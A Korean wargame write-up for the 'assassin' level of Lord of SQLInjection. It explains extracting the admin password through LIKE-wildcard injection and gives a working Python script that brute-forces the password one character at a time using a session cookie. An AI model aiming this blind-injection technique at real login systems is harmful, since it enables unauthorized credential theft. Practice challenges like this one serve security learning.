---
title: "Lord of SQLInjection - ASSASSIN"
categories: 
  - SQLi
tags:
  - SQLi
  - 웹해킹
toc: true
---

# ASSASSIN
## 문제 
![img](/assets/images/los/assassin1.png)

- like 문을 통해서 admin의 password를 추출하는 문제다.

1. python으로 guest의 패스워드를 구하였지만 정답이 아니었다. 그 결과로 admin의 password를 추출해야 하는 것을 확인함.
2. for문을 돌릴 시 처음 루프에서 Hello guest는 확인되지만 Hello admin은 확인되지 않음. 따라서 guest와 admin의 password는 겹치는 부분이 있고 guest로 출력되는 것을 확인.

## 정답

- 패스워드를 전부 찾는 방법과 %를 이용하여 guest와 admin의 다른 비밀번호를 이용하여 푸는 방법이 있다.

- 참고로 guest의 비밀번호는 90d2fe10이다.

![img](/assets/images/los/assassin2.png)

![img](/assets/images/los/assassin3.png)

![img](/assets/images/los/assassin4.png)

## 코드

```python
import requests

password = ''

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"

cookie = {'PHPSESSID' : 'PHP 세션 아이디'}

admin_pwd=''

for i in range(1, 9):
    isFound = False
    tmp = ''
    for j in range(48, 127):
        # _ 필터링
        if j == 95:
            continue
        query = "?pw=%s%s%%" %(admin_pwd, chr(j))
        URL = url+query
        r = requests.get(url=URL, cookies=cookie)
        
        if 'Hello guest' in str(r.content):
            tmp = chr(j)
        if 'Hello admin' in str(r.content):
            admin_pwd += chr(j)
            isFound = True
            break
    if isFound == False:
        admin_pwd += tmp
print ('admin_password : %s' %admin_pwd)
```